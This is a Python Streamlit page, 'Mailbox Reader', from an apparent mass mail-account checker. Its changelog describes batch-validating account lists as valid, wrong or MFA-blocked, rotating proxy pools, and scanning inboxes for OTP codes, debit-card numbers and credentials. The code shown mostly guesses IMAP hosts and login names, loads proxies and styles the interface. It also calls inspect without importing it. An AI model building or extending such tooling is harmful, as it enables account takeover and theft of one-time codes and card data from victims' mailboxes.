# @@FILE pages/3_Mailbox_Reader.py blocks=44 version=v13.56
# @@BLOCK 000 FILE_HEADER deps=-
"""
pages/3_Mailbox_Reader.py — Bobito Mailbox Reader & Portal Hub  (v13.47)
=======================================================================
Interactive inbox inspection: bot intelligence, OTP / debit-card / credential
scanning, multi-field search, Telegram + blacklist filtering.

v13.40 fixes on this page
-------------------------
* URLPARSE IMPORT DROPPED: removed unused import.
* KEEPALIVE FIXED: used `streamlit.components.v1.html()` so the 30s health ping actually executes.
* IMAP-UTF7 &- DECODE BUG FIXED: rewritten scanning loop avoids turning `A & B` into `A - B`.
* DUPLICATE FOLDER LABELS RENAME-SAFE: `INBOX.Sent` and `Sent` no longer overwrite each other in `folder_map`.
* CLEAR-ALL GUARD FIXED: `clean_proxies.txt` is no longer truncated to 0 bytes by Delete ALL Valid Accounts.
* PASSWORD CORRUPTION ELIMINATED: space stripping and `|` truncation removed from account parsers.
* ATOMIC DELETION: file writes use `.tmp` + `os.replace` to prevent partial truncation.
* "NONE" SENTINEL REMOVED: list filter ensures the `none` placeholder never leaks into downloads or deletion options.
* STALE SOCKETS & CACHE BINDING: `get_active_mail` binds the connection key to host + port.
* TRY_ALT_USERNAME HONOURED: manual login paths now respect the config toggle.
* PROXY PROBE PORT FIXED: proxy reachability and socket probes now test the configured port instead of hardcoded 993.
* SOCKET LEAKS PLUGGED: connection ladder and proxy probes properly close abandoned or failed sockets.
* WHOLE-WORD KEYWORD MATCHING: replaced substring `in` checks with robust word boundary regex to stop false positives.
* LUHN CHECK ON CARDS: credit card regex validator now enforces Luhn checksums to reject order numbers.
* HTML-ONLY MAIL SUPPORTED: mail body extractor parses HTML parts and strips tags when `text/plain` is empty.
* GLOBAL PAGINATION: folder search results are collected globally before slicing to fix overlapping page ranges.
* FLASH MESSAGES PRESERVED: added persistent flash state so action toasts survive `st.rerun()`.
* BATCH RUN RESULTS PERSISTED: batch failures and wrong/appass verdicts are written to individual text files and CSV.
* PAGER MATCH COUNTERS RESTORED: global search and OTP pagers count true matches instead of page slices.
* PHASE-2 SELECT VALIDATION: message fetch loops verify IMAP folder selection status per hop.

v13.43 fixes on this page
-------------------------
* PER-USER STORAGE: results dir, clean-valid, last account, config, session cache and
  every batch result file resolve through user_file(); foreign <hash>_ files are skipped.
* LIST PARSER: a LIST line carrying no delimiter no longer swallows the mailbox name.
* PROXY PROBE PORT: the probe dials the port that is about to be dialled.
* BATCH SEARCH MATCHING: word boundaries instead of raw substring, so 'pin' stops
  matching 'shipping'.
* CACHE WRITE THROTTLE: log() no longer rewrites the whole session cache per line.
* KEEPALIVE: st.iframe data: URI with a components.html fallback.
* PAGER CLAMPS: the bot page counter cannot reach 0; the purge checks the STORE reply.

v13.47 fixes on this page
-------------------------
* USER_FILE IMPORT: block 001 imports user_file from auth. Blocks 012 and 019 use
  it at module level and block 032 inside append_result(); without the import the
  page died at block 012 with NameError before rendering anything.
* DISPLAY FIT PANEL: auth.fit_panel() is called in block 001. auth.fit() injects
  the CSS only, so without this the whole Display Fit control disappeared.
* KEEPALIVE HEIGHT: st.iframe rejects height=0 (validate_height raises on <= 0),
  so every run fell through to the deprecated components.html. A bare HTML string
  is also passed now instead of a data: URI, because src-loaded data: frames have
  no app origin for a root-relative fetch; srcdoc keeps it.
  
  v13.56 fixes on this page
-------------------------
* UI PERSISTENCE: reader_ui.json, per user, whitelisted keys only, restored before
  any widget exists and written once per run when it changes. Settings, toggles,
  sliders, keyword boxes and per-mail body edits now survive a reload. Body edits
  are keyed by account|folder|mode|page, so switching mail clears the previous one.
* KEYED WIDGETS: folder, page size, sort order and bot scan depth had no key at all
  and reset on every rerun. All keyed, all validated against live options.
* STREAM FILTERS NOTHING: bot filtering is an opt-in checkbox, default OFF, and the
  extortion/ransom drop in fetch_messages_paginated is now a category tag.
* HTML FOLLOWS THE SWITCH: a global view mode, persisted, forced to HTML while the
  remote-image switch is on. Per-message radios remain as the fallback.
* NO TRUNCATION: the 256 KB partial BODY.PEEK[] fetch is gone, and mailview's caps
  moved to 8 MB raw / 4 MB markup.
* NO REFETCH PER RERUN: mailview memoises the full fetch and the sanitised shell.
* NO HARD LOADING: the valid-list fingerprint is TTL-cached, the cache writer is
  paused for the whole fetch loop, and the diagnostic panes render 250 lines.
* SEARCH REACHES THE WHOLE MAILBOX: an "all folders" box starts ticked, the term
  cap moved 25 -> 60, and the fallback walks BODY.PEEK[TEXT] 250 at a time.
* THREE EXPANDERS BECAME CHECKBOXES: an expander collapses on every rerun.
* CROSS-USER CACHE FIXES: _UI_WRITE, _VALID_CACHE, _FP_MEMO, _ZIP_CACHE and every
  mailview cache are keyed per user, so one user cannot suppress or serve another.
"""

import streamlit as st
import streamlit.components.v1 as components
import imaplib
# Raise the default 1 MB line limit so large SEARCH responses do not abort.
# A mailbox with tens of thousands of messages can return a SEARCH line longer than 1 MB.
imaplib.IMAP4.maxline = 10_000_000
import glob
import os
import re
import html
import base64
import math
import time
import socket
import ssl as _ssl
import zipfile
import io
import json
import csv
from datetime import datetime
from typing import List, Tuple
from urllib.parse import quote
from email.header import decode_header
from email import message_from_bytes
# @@END 000 FILE_HEADER


# @@BLOCK 001 PAGE_CONFIG deps=000
st.set_page_config(page_title="Mailbox Reader - Mail Checker", page_icon="📬",
                   layout="wide", initial_sidebar_state="collapsed")

import sys as _sys

_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _ROOT not in _sys.path:
    _sys.path.insert(0, _ROOT)

import importlib

import auth

# A module cached from before a redeploy keeps the OLD shape. hasattr(), not a
# bare `auth.fit_panel` expression - the bare form is magic-written by Streamlit
# (st.help -> ast.parse) and can raise IndentationError on the `try:`.
if not hasattr(auth, "fit_panel"):
    auth = importlib.reload(auth)

from auth import user_file          # blocks 012, 019 and 032 resolve paths through it
                                    # NB: must stay AFTER the reload above

# v13.48: ledger. page() before the gate, install() after it, both above the
# first widget so the sidebar and the page body are wrapped. fit_panel() is NOT
# called here - it renders the Display Fit expanders and belongs under the hero
# (block 027), so install() must land before it to see its sliders.
#
# FIX AU-1 (v13.49): a module imported before a redeploy stays in sys.modules and
# keeps answering with the OLD shape. audit_log gained page() at 02:25, two hours
# after this process had already imported it at 00:42, so this page died on the
# next line with AttributeError - and install() below never ran, which is why the
# ledger only ever held button presses and never a single slider. Same hasattr +
# reload guard auth and runstate already use; both calls are optional, so a
# reload that also fails degrades to "no ledger" instead of a dead page.
import audit_log as _audit

if not (hasattr(_audit, "page") and hasattr(_audit, "install")):
    try:
        _audit = importlib.reload(_audit)
    except Exception:
        pass
audit_log = _audit

if hasattr(audit_log, "page"):
    audit_log.page("pages/3_Mailbox_Reader.py")

auth.require(st, "Unlock Mailbox Reader")
auth.fit(st)                        # CSS only, before the first widget

if hasattr(audit_log, "install"):
    audit_log.install(st, "pages/3_Mailbox_Reader.py")
# @@END 001 PAGE_CONFIG


# @@BLOCK 002 HOSTS_IMPORT deps=001
try:
    from hosts import host_list
except ImportError:
    def host_list(email: str) -> List[str]:
        domain = email.split("@")[-1].lower() if "@" in email else ""
        return [f"imap.{domain}"] if domain else ["imap.gmail.com"]

# v13.57: body renderer. Optional - a failed import degrades to the plain
# text_area, it must never blank the page.
#
# hasattr() IS NOT A SHAPE CHECK. A module cached before a redeploy keeps the old
# signature; hasattr(mailview, "render_auto") is True on the pre-v13.56 module
# too, whose def is render_auto(st, msg, key, mail_getter, allow_remote=False)
# with no `view` and no `ns`. The call sites pass both, so the first rendered
# row raised TypeError and killed the page. __version__ cannot detect it - it is
# frozen at "v13.55" on purpose. So probe the PARAMETERS the call sites use,
# reload once, and drop the renderer entirely if they are still missing.
def _mv_capable(mod) -> bool:
    try:
        params = inspect.signature(mod.render_auto).parameters
    except Exception:
        return False
    return "view" in params and "ns" in params

try:
    import mailview
    if not _mv_capable(mailview):
        mailview = importlib.reload(mailview)
        if not _mv_capable(mailview):
            mailview = None
except Exception:
    mailview = None
# @@END 002 HOSTS_IMPORT


# @@BLOCK 003 MS_OAUTH_IMPORT deps=001
# --- ms_oauth.py : Microsoft XOAUTH2 (personal accounts) --------------------
try:
    import ms_oauth as _ms_oauth
    _MS_OAUTH_OK = True
    _MS_IMAP_HOSTS = set(_ms_oauth.MS_IMAP_HOSTS)
except Exception:
    _ms_oauth = None
    _MS_OAUTH_OK = False
    _MS_IMAP_HOSTS = {"outlook.office365.com", "imap-mail.outlook.com"}
# @@END 003 MS_OAUTH_IMPORT


# @@BLOCK 004 MSVERDICT_CLASS deps=000
# ============================================================================
# v13.37: a DEFINITIVE Microsoft answer must not be softened into APPASS
# ============================================================================
class MsVerdict(Exception):
    """Raised when Microsoft gave a definitive answer.

    verdict == "WRONG"   -> the password is wrong; stop host-hopping.
    verdict == "APPASS"  -> MFA is on; an app password is required.
    """

    def __init__(self, verdict, detail=""):
        super().__init__(detail or verdict)
        self.verdict = verdict
        self.detail = detail or verdict
# @@END 004 MSVERDICT_CLASS


# @@BLOCK 005 PROVIDER_KNOWLEDGE deps=000
# ============================================================================
# PROVIDER KNOWLEDGE
# ============================================================================
# Host order is owned by hosts.py. This page no longer overrides it.
# candidate_hosts() calls host_list() first, then appends generic guesses last.
# ZERO_ACCESS_PROVIDERS still marks domains that have no IMAP at all.

ZERO_ACCESS_PROVIDERS = {
    "proton.me", "protonmail.com", "pm.me",
    "tuta.com", "tutanota.com", "tuta.io",
}

def candidate_hosts(email_addr: str, override_host: str = "") -> List[str]:
    """Ordered, de-duplicated host candidates. Never returns an empty list.
    Uses hosts.py host_list() as the single source of truth.
    """
    email_addr = (email_addr or "").strip()
    domain = email_addr.split("@")[-1].lower() if "@" in email_addr else ""

    ordered: List[str] = []

    def push(h):
        if h and h not in ordered:
            ordered.append(h)

    if override_host and override_host.strip():
        push(override_host.strip())

    try:
        for h in (host_list(email_addr) or []):
            push(h)
    except Exception:
        pass

    if domain:
        push(f"imap.{domain}")
        push(f"mail.{domain}")
        push(f"webmail.{domain}")
        push(f"correo.{domain}")
        push(domain)

    return ordered

def username_candidates(email_addr: str) -> List[str]:
    """Full address first, then the bare local part.

    Legacy ISP servers (Zimbra / cPanel / Dovecot deployments that predate
    full-address logins) authenticate on the local part only.
    """
    email_addr = (email_addr or "").strip()
    if not email_addr:
        return [email_addr]
    out = [email_addr]
    if "@" in email_addr:
        local = email_addr.split("@", 1)[0].strip()
        if local and local.lower() != email_addr.lower():
            out.append(local)
    return list(dict.fromkeys(out))
# @@END 005 PROVIDER_KNOWLEDGE


# @@BLOCK 006 THEME_DATA deps=000
# ============================================================================
# SHARED THEME ENGINE
# ============================================================================

_THIS_DIR = os.path.dirname(os.path.abspath(__file__))
APP_DIR = os.path.dirname(_THIS_DIR)                      # repo root

# v13.65: THE THEME FILE WAS THE BARE ONE. theme.json became per-user
# (<hash>_theme.json) at v13.61, so APP_DIR/theme.json no longer exists and this
# page always painted the factory palette - and save_theme() wrote the bare path,
# so a colour change made here was invisible to the checker as well. Block 001
# has already run the gate and imported user_file, so the owner's real path is
# available HERE, at module level, with nothing lazy needed.
THEME_FILE = user_file("theme.json")

THEME_PRESETS = {
    "Aurora":    {"g1": "#667eea", "g2": "#764ba2", "accent": "#8b5cf6", "accent2": "#22d3ee", "bg": "#0b1020", "panel": "#141b30", "text": "#e6ebff"},
    "Neon":      {"g1": "#f72585", "g2": "#7209b7", "accent": "#f72585", "accent2": "#4cc9f0", "bg": "#0a0118", "panel": "#180a2c", "text": "#f5e9ff"},
    "Ocean":     {"g1": "#2193b0", "g2": "#6dd5ed", "accent": "#38bdf8", "accent2": "#22d3ee", "bg": "#04141c", "panel": "#0a2432", "text": "#e0f7ff"},
    "Emerald":   {"g1": "#11998e", "g2": "#38ef7d", "accent": "#34d399", "accent2": "#a3e635", "bg": "#06140f", "panel": "#0e2519", "text": "#e3ffee"},
    "Sunset":    {"g1": "#ff6b6b", "g2": "#f9a826", "accent": "#fb923c", "accent2": "#ffd166", "bg": "#1a0f0a", "panel": "#2b1a11", "text": "#fff3e6"},
    "Crimson":   {"g1": "#eb3349", "g2": "#f45c43", "accent": "#f43f5e", "accent2": "#fb923c", "bg": "#160609", "panel": "#270c13", "text": "#ffe8ec"},
    "Royal":     {"g1": "#243b55", "g2": "#4b6cb7", "accent": "#60a5fa", "accent2": "#c084fc", "bg": "#070b12", "panel": "#111a28", "text": "#e2e8f5"},
    "Gold":      {"g1": "#b8860b", "g2": "#ffd700", "accent": "#fbbf24", "accent2": "#f59e0b", "bg": "#141005", "panel": "#251d0a", "text": "#fff8dc"},
    "Candy":     {"g1": "#ff9a9e", "g2": "#fecfef", "accent": "#fb7185", "accent2": "#f9a8d4", "bg": "#1a1016", "panel": "#2b1a24", "text": "#fff0f6"},
    "Cyber":     {"g1": "#00f5d4", "g2": "#0077b6", "accent": "#00f5d4", "accent2": "#90e0ef", "bg": "#03060d", "panel": "#0a1220", "text": "#dffffb"},
    "Grape":     {"g1": "#8e2de2", "g2": "#4a00e0", "accent": "#a78bfa", "accent2": "#f472b6", "bg": "#0b0418", "panel": "#180a2b", "text": "#f1e8ff"},
    "Daylight":  {"g1": "#6366f1", "g2": "#06b6d4", "accent": "#4f46e5", "accent2": "#0891b2", "bg": "#f1f5f9", "panel": "#ffffff", "text": "#0f172a"},
    "Mono":      {"g1": "#3f3f46", "g2": "#71717a", "accent": "#a1a1aa", "accent2": "#d4d4d8", "bg": "#0a0a0b", "panel": "#19191c", "text": "#f4f4f5"},
}

DEFAULT_PRESET = "Aurora"

def _lum(hex_color: str) -> float:
    try:
        h = str(hex_color).lstrip("#")
        r, g, b = int(h[0:2], 16), int(h[2:4], 16), int(h[4:6], 16)
        return (0.299 * r + 0.587 * g + 0.114 * b) / 255.0
    except Exception:
        return 0.0

def default_theme() -> dict:
    p = THEME_PRESETS[DEFAULT_PRESET]
    return {
        "preset": DEFAULT_PRESET,
        "g1": p["g1"], "g2": p["g2"], "accent": p["accent"], "accent2": p["accent2"],
        "bg": p["bg"], "panel": p["panel"], "text": p["text"],
        "radius": 14, "glow": True, "animate": True, "glass": True, "colorize_logs": True,
    }

def _theme_candidates() -> List[str]:
    """The owner's file first, then the two legacy bare paths."""
    cands = [THEME_FILE, os.path.join(APP_DIR, "theme.json"), os.path.abspath("theme.json")]
    out, seen = [], set()
    for c in cands:
        try:
            ap = os.path.abspath(c)
        except Exception:
            continue
        if ap not in seen:
            seen.add(ap)
            out.append(c)
    return out

def load_theme() -> dict:
    """The owner's theme when it parses, else the defaults."""
    base = default_theme()
    for path in _theme_candidates():
        if not path or not os.path.exists(path):
            continue
        try:
            with open(path, encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, dict):
                base.update({k: v for k, v in data.items() if k in base})
                break
        except Exception:
            continue
    return base

def save_theme(th: dict) -> None:
    """Writes back to the OWNER's file so the checker picks the change up too."""
    for path in (_theme_candidates()[:1] or [THEME_FILE]):
        try:
            with open(path, "w", encoding="utf-8") as f:
                json.dump(th, f, indent=2)
            return
        except Exception:
            continue

def is_light(th: dict) -> bool:
    return _lum(th.get("bg", "#000000")) > 0.6
# @@END 006 THEME_DATA


# @@BLOCK 007 THEME_CSS deps=006
def _readable_text(th: dict) -> str:
    """`text`, or white/black when `text` and `bg` are too close to read.

    is_light() only looked at bg, so a dark bg with a dark text colour rendered
    every character in near-black on black. Emoji survived (colour glyphs) and
    the words vanished, which read as "the page hangs / only dark".
    """
    t, b = _lum(th.get("text", "#ffffff")), _lum(th.get("bg", "#000000"))
    if abs(t - b) >= 0.35:
        return th.get("text", "#ffffff")
    return "#0f172a" if b > 0.6 else "#f4f6fb"


def theme_css(th: dict) -> str:
    g1, g2 = th["g1"], th["g2"]
    ac, ac2 = th["accent"], th["accent2"]
    bg, panel, text = th["bg"], th["panel"], _readable_text(th)
    r = int(th.get("radius", 14))
    light = is_light(th)
    border = "rgba(15,23,42,0.14)" if light else "rgba(255,255,255,0.10)"
    soft = "rgba(15,23,42,0.05)" if light else "rgba(255,255,255,0.04)"
    dim = "rgba(15,23,42,0.65)" if light else "rgba(230,235,255,0.70)"

    glass_css = "backdrop-filter: blur(6px);" if th.get("glass", True) else ""
    anim_css = ""
    if th.get("animate", True):
        anim_css = """
    .bb-hero { background-size: 240% 240%; animation: bbShift 14s ease infinite; }
    @keyframes bbShift { 0%{background-position:0% 50%} 50%{background-position:100% 50%} 100%{background-position:0% 50%} }
    @media (prefers-reduced-motion: reduce) { .bb-hero { animation: none !important; } }
    """

    return f"""
<style>
    :root {{
        --bb-g1: {g1}; --bb-g2: {g2}; --bb-ac: {ac}; --bb-ac2: {ac2};
        --bb-bg: {bg}; --bb-panel: {panel}; --bb-text: {text}; --bb-r: {r}px;
    }}
    .stApp, [data-testid="stAppViewContainer"], section.main {{ background: {bg} !important; color: {text} !important; }}
    [data-testid="stHeader"] {{ background: transparent !important; }}
    [data-testid="stSidebar"] {{
        background: linear-gradient(180deg, {panel} 0%, {bg} 100%) !important;
        border-right: 1px solid {border};
    }}
    [data-testid="stSidebar"] p,
    [data-testid="stSidebar"] label,
    [data-testid="stSidebar"] .stMarkdown span {{ color: inherit; }}
    h1, h2, h3, h4, h5, h6 {{ color: {text} !important; letter-spacing: .2px; }}
    p, span, label, li, small, strong {{ color: {text}; }}
    hr {{ border-color: {border} !important; }}
    a {{ color: {ac2} !important; }}

    .stButton > button, .stDownloadButton > button, .stFormSubmitButton > button {{
        background: {panel} !important; color: {text} !important;
        border: 1px solid {border} !important; border-radius: {r}px !important;
        font-weight: 600; transition: all .16s ease;
    }}
    .stButton > button:hover, .stDownloadButton > button:hover {{
        border-color: {ac} !important; transform: translateY(-1px);
        box-shadow: 0 6px 18px {ac}44;
    }}
    .stButton > button[kind="primary"], .stDownloadButton > button[kind="primary"] {{
        background: linear-gradient(135deg, {g1} 0%, {g2} 100%) !important;
        color: #fff !important; border: none !important;
        box-shadow: 0 8px 22px {g1}66;
    }}
    .stButton > button[kind="primary"]:hover {{ filter: brightness(1.08); }}

    [data-testid="stMetric"] {{
        background: {panel} !important; border: 1px solid {border};
        border-left: 4px solid {ac}; border-radius: {r}px;
        padding: 14px 16px; {glass_css}
    }}
    [data-testid="stMetricValue"] {{ color: {ac} !important; font-weight: 800 !important; }}
    [data-testid="stMetricLabel"] {{ color: {dim} !important; }}

    .stTabs [data-baseweb="tab-list"] {{ gap: 6px; border-bottom: 1px solid {border}; }}
    .stTabs [data-baseweb="tab"] {{
        background: {panel}; border-radius: {r}px {r}px 0 0;
        color: {text} !important; padding: 8px 16px; font-weight: 600;
    }}
    .stTabs [aria-selected="true"] {{
        background: linear-gradient(135deg, {g1}, {g2}) !important; color: #fff !important;
    }}
    .stTabs [data-baseweb="tab-highlight"] {{ background: {ac} !important; }}

    [data-testid="stExpander"] {{
        border: 1px solid {border} !important; border-radius: {r}px !important;
        background: {soft} !important; overflow: hidden;
    }}
    [data-testid="stExpander"] summary {{ color: {text} !important; font-weight: 600; }}

    input, textarea, select, .stTextInput input, .stTextArea textarea,
    .stNumberInput input, .stSelectbox div[data-baseweb="select"] > div {{
        background: {panel} !important; color: {text} !important;
        border: 1px solid {border} !important; border-radius: 10px !important;
    }}
    [data-baseweb="popover"] div {{ background: {panel} !important; color: {text} !important; }}
    [data-baseweb="tag"] {{ background: {ac}44 !important; color: {text} !important; }}

    .stSlider [data-baseweb="slider"] div[role="slider"] {{ background: {ac} !important; }}
    .stProgress > div > div > div > div {{ background: linear-gradient(90deg, {g1}, {g2}) !important; }}
    [data-baseweb="checkbox"] span, [data-baseweb="toggle"] span {{ border-color: {ac} !important; }}

    code, pre, .stCode, .stCodeBlock, [data-testid="stCodeBlock"] {{
        background: {bg} !important; color: {ac2} !important;
        border: 1px solid {border} !important; border-radius: 10px !important;
    }}
    [data-testid="stDataFrame"] {{ border: 1px solid {border} !important; border-radius: 10px !important; }}

    .bb-hero {{
        background: linear-gradient(135deg, {g1} 0%, {g2} 100%);
        padding: 26px 32px; border-radius: {r}px; margin-bottom: 18px;
        box-shadow: 0 14px 38px {g1}55; border: 1px solid rgba(255,255,255,.10);
    }}
    .bb-hero h1 {{ color: #fff !important; margin: 0; font-size: 1.85rem; font-weight: 800; }}
    .bb-hero p {{ color: rgba(255,255,255,.94) !important; margin: 8px 0 0 0; font-size: .93rem; }}
    .bb-hero .bb-tags {{ margin-top: 12px; }}
    .bb-tag {{
        display: inline-block; padding: 3px 11px; margin: 0 6px 6px 0;
        border-radius: 999px; font-size: .72rem; font-weight: 700;
        background: rgba(255,255,255,.20); color: #fff !important;
        border: 1px solid rgba(255,255,255,.28);
    }}
    .bb-section {{
        display: flex; align-items: center; gap: 12px;
        margin: 22px 0 12px 0; padding: 11px 18px; border-radius: {r}px;
        background: linear-gradient(90deg, {g1}38 0%, {g1}10 45%, transparent 85%);
        border-left: 4px solid {ac};
    }}
    .bb-section .bb-ico {{ font-size: 1.2rem; }}
    .bb-section .bb-t {{ font-weight: 800; font-size: 1.02rem; color: {text}; }}
    .bb-section .bb-s {{ font-size: .76rem; color: {dim}; margin-left: 8px; }}

    .bb-logbox {{
        background: {bg}; border: 1px solid {border}; border-radius: {r}px;
        padding: 10px 12px; font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
        font-size: .78rem; max-height: 360px; overflow-y: auto;
    }}

    .help-box {{
        background: {panel}; border-left: 3px solid {ac};
        padding: 6px 10px; margin: 2px 0 8px 0;
        font-size: .78rem; color: {text}; opacity: .9;
        border-radius: 4px; line-height: 1.35;
    }}

    ::-webkit-scrollbar {{ width: 10px; height: 10px; }}
    ::-webkit-scrollbar-track {{ background: {bg}; }}
    ::-webkit-scrollbar-thumb {{ background: {g1}88; border-radius: 8px; }}
    ::-webkit-scrollbar-thumb:hover {{ background: {ac}; }}

    /* the health-ping frame must not occupy layout */
    iframe[title="st.iframe"], iframe[height="1"], iframe[height="0"] {{
        height: 0 !important; display: block; border: 0 !important;
    }}

    /* ---- v13.39 MOBILE FIT ---- */
    .block-container, [data-testid="stMainBlockContainer"] {{
        padding-top: 1.2rem !important;
        padding-bottom: 2rem !important;
    }}
    @media (max-width: 820px) {{
        .block-container, [data-testid="stMainBlockContainer"] {{
            padding: 0.55rem 0.7rem calc(1.3rem + env(safe-area-inset-bottom)) 0.7rem !important;
            max-width: 100% !important;
        }}
        /* v13.40a: app.py removed this - it fought Streamlit's own header */
        [data-testid="stToolbar"] {{ right: 0.3rem; }}
        [data-testid="stSidebar"] {{ width: 88vw !important; min-width: 88vw !important; }}
        .bb-hero {{ padding: 14px 16px; border-radius: 12px; margin-bottom: 10px; }}
        .bb-hero h1 {{ font-size: 1.18rem; line-height: 1.25; }}
        .bb-hero p {{ font-size: .76rem; line-height: 1.35; }}
        .bb-tag {{ font-size: .61rem; padding: 2px 8px; margin: 0 4px 4px 0; }}
        .bb-section {{ margin: 14px 0 8px 0; padding: 8px 12px; gap: 8px; }}
        .bb-section .bb-t {{ font-size: .9rem; }}
        .bb-section .bb-s {{ display: block; margin: 2px 0 0 0; font-size: .67rem; }}
        /* the reader's .bb-logbox is a fixed 360px box - vh keeps it on-screen */
        .bb-logbox {{ font-size: .67rem; padding: 8px; max-height: 42vh; }}
        .help-box {{ font-size: .7rem; }}
        [data-testid="stMetric"] {{ padding: 8px 10px; }}
        [data-testid="stMetricValue"] {{ font-size: 1.15rem !important; }}
        [data-testid="stMetricLabel"] {{ font-size: .65rem !important; }}
        .stTabs [data-baseweb="tab"] {{ padding: 6px 10px; font-size: .78rem; }}
        .stTabs [data-baseweb="tab-list"] {{ gap: 2px; }}
        h1 {{ font-size: 1.3rem !important; }}
        h2 {{ font-size: 1.12rem !important; }}
        h3 {{ font-size: 1rem !important; }}
        .stButton > button, .stDownloadButton > button {{ padding: .35rem .5rem; font-size: .8rem; }}
        [data-testid="stDataFrame"] {{ font-size: .72rem; }}
        pre, code, .stCode {{ font-size: .68rem !important; }}
        textarea, input {{ font-size: .8rem !important; }}
    }}
    @media (max-width: 420px) {{
        .block-container {{ padding-left: 0.5rem !important; padding-right: 0.5rem !important; }}
        .bb-hero h1 {{ font-size: 1.05rem; }}
        [data-testid="stMetricValue"] {{ font-size: 1rem !important; }}
        [data-testid="stMetricLabel"] {{ font-size: .6rem !important; }}
    }}
    @media (hover: none) {{
        [data-testid="stSidebarCollapsedControl"] {{ top: .3rem; }}
    }}
    /* v13.40: 4-wide action rows and 5-wide metric rows were untappable */
    @media (max-width: 700px) {{
        [data-testid="stHorizontalBlock"] {{ flex-wrap: wrap !important; gap: .35rem !important; }}
        [data-testid="column"] {{ flex: 1 1 46% !important; min-width: 46% !important; }}
        [data-testid="stHorizontalBlock"] > div:nth-child(5) {{ flex: 1 1 46% !important; }}
        .stTextArea textarea {{ min-height: 92px !important; }}
        [data-testid="stMetricValue"] {{ font-size: 1.05rem !important; }}
    }}
    {anim_css}
</style>
"""
# @@END 007 THEME_CSS


# @@BLOCK 008 UI_HELPERS deps=006
def hero(title: str, subtitle: str = "", tags: List[str] = None) -> None:
    tag_html = "".join(f'<span class="bb-tag">{html.escape(t)}</span>' for t in (tags or []))
    st.markdown(
        f'<div class="bb-hero"><h1>{html.escape(title)}</h1>'
        f'<p>{html.escape(subtitle)}</p><div class="bb-tags">{tag_html}</div></div>',
        unsafe_allow_html=True,
    )

def section(icon: str, title: str, subtitle: str = "") -> None:
    sub = f'<span class="bb-s">{html.escape(subtitle)}</span>' if subtitle else ""
    st.markdown(
        f'<div class="bb-section"><span class="bb-ico">{icon}</span>'
        f'<span class="bb-t">{html.escape(title)}</span>{sub}</div>',
        unsafe_allow_html=True,
    )
# @@END 008 UI_HELPERS


# @@BLOCK 009 PROXY_LOADER deps=000
# Dynamic Proxy Auto-Fetch Engine
def load_app_proxies() -> List[dict]:
    """Proxies come from the same files the checker uses. NO hardcoded IP.

    Returns [] when nothing is configured, so every connection goes direct.
    """
    proxy_files = ["proxies.txt", "proxy_pool.txt", "clean_proxies.txt"]
    dynamic_pool = []

    if st.session_state.get("session_proxies"):
        for p in st.session_state.session_proxies:
            if isinstance(p, dict):
                dynamic_pool.append(p)
            elif isinstance(p, str) and p.strip():
                dynamic_pool.append({"proxy": p.strip(), "country": "Dynamic", "region": "Global", "latency": 350})
        if dynamic_pool:
            return dynamic_pool

    for pfile in proxy_files:
        if os.path.exists(pfile):
            try:
                with open(pfile, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        line_str = line.strip()
                        if not line_str or line_str.startswith("#"):
                            continue
                        parts = [x.strip() for x in line_str.replace(",", "|").split("|") if x.strip()]
                        proxy_addr = parts[0]
                        if ":" in proxy_addr:
                            country = parts[2] if len(parts) > 2 else "unknown"
                            region = parts[3] if len(parts) > 3 else "unknown"
                            latency = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 350
                            dynamic_pool.append({
                                "proxy": proxy_addr,
                                "country": country,
                                "region": region,
                                "latency": latency
                            })
            except Exception as ex:
                try:
                    st.session_state.folder_debug_logs.append(f"Proxy load warning: {ex}")
                except Exception:
                    pass
            if dynamic_pool:
                return dynamic_pool

    return dynamic_pool
# @@END 009 PROXY_LOADER


# @@BLOCK 010 KEEPALIVE_AND_THEME_APPLY deps=007
# v13.40: st.markdown() strips <script>, so a real embed is required to run it.
# v13.47: st.iframe rejects height=0 (validate_height raises on <= 0), so every
# run fell through to the deprecated components.html. A data: URI also loads via
# src, where a root-relative fetch has no app origin to resolve against; a bare
# HTML string goes to srcdoc and keeps the parent origin, which is what makes the
# health fetch work at all.
#
# v13.47b: height=1 still left a ~90px bordered empty frame under the header, so
# the page opened on a blank panel and looked hung. The frame is pinned to zero
# height by the stylesheet (block 007) instead of being trusted to honour 1px.
_PING_HTML = (
    "<script>setInterval(function(){try{fetch('/_stcore/health',{cache:'no-store'});}"
    "catch(e){}},30000);</script>"
)
try:
    st.iframe(_PING_HTML, height=1)
except Exception:
    try:
        components.html(_PING_HTML, height=0)
    except Exception:
        pass

# --- Load shared theme and inject it (must happen before anything renders) ---
THEME = load_theme()
st.markdown(theme_css(THEME), unsafe_allow_html=True)
# @@END 010 KEEPALIVE_AND_THEME_APPLY


# @@BLOCK 011 SIDEBAR_THEME deps=010
# --- Theme control (writes the same file the checker reads) ---
with st.sidebar.expander("🎨 Theme (synced with checker)", expanded=False):
    _names = list(THEME_PRESETS.keys())

    _seed = {
        "rd_preset": THEME.get("preset", DEFAULT_PRESET) if THEME.get("preset", DEFAULT_PRESET) in _names else DEFAULT_PRESET,
        "rd_g1": THEME["g1"], "rd_g2": THEME["g2"],
        "rd_bg": THEME["bg"], "rd_text": THEME["text"],
    }
    for _k, _v in _seed.items():
        if _k not in st.session_state:
            st.session_state[_k] = _v

    def _rd_apply_preset():
        p = THEME_PRESETS.get(st.session_state.get("rd_preset"))
        if p:
            st.session_state["rd_g1"] = p["g1"]
            st.session_state["rd_g2"] = p["g2"]
            st.session_state["rd_bg"] = p["bg"]
            st.session_state["rd_text"] = p["text"]

    st.selectbox("Preset Gradient", _names, key="rd_preset", on_change=_rd_apply_preset)

    _ca, _cb = st.columns(2)
    with _ca:
        st.color_picker("Gradient Start", key="rd_g1")
        st.color_picker("Background", key="rd_bg")
    with _cb:
        st.color_picker("Gradient End", key="rd_g2")
        st.color_picker("Body Text", key="rd_text")

    if (
        st.session_state["rd_g1"] != THEME["g1"]
        or st.session_state["rd_g2"] != THEME["g2"]
        or st.session_state["rd_bg"] != THEME["bg"]
        or st.session_state["rd_text"] != THEME["text"]
        or st.session_state.get("rd_preset") != THEME.get("preset")
    ):
        THEME.update({
            "preset": st.session_state.get("rd_preset", DEFAULT_PRESET),
            "g1": st.session_state["rd_g1"], "g2": st.session_state["rd_g2"],
            "bg": st.session_state["rd_bg"], "text": st.session_state["rd_text"],
        })
        save_theme(THEME)
